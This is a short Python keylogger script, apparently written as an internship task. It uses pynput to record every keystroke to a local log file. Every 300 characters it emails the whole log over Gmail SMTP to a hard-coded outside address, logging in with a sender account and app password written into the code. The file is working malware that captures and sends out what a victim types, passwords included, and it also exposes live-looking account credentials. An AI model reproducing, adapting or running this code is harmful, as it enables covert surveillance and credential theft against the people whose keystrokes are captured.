import os
import logging
import smtplib
from pynput.keyboard import Key, Listener
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

log_dir = "D:\intership\Task 4"
log_file = log_dir + r"/keyLog.txt"
word_count = 0


if not os.path.exists(log_dir):
    os.makedirs(log_dir)

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def send_email(file_path):
    from_email = "piek446@gmail.com"
    password = "bwhh xdqn uyvu xapx"
    to_email = "yashgadhiya5809@gmail.com"

    try:
        msg = MIMEMultipart()
        msg['From'] = from_email
        msg['To'] = to_email
        msg['Subject'] = 'Keylog Report'

        with open(file_path, 'r') as file:
            body = file.read()

        msg.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(from_email, password)
            server.sendmail(from_email, to_email, msg.as_string())
        logging.info("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")

def on_press(key):
    global word_count
    try:
        if hasattr(key, 'char') and key.char:
            logging.info(key.char)
            word_count += 1
            if word_count % 300 == 0:
                send_email(log_file)
        elif key == Key.space:
            logging.info(' ')
        elif key == Key.enter:
            logging.info('\n')
        elif key == Key.backspace:
            logging.info('[BACKSPACE]')
    except Exception as e:
        logging.error(f"Error: {e}")

with Listener(on_press=on_press) as listener:
    listener.join()
 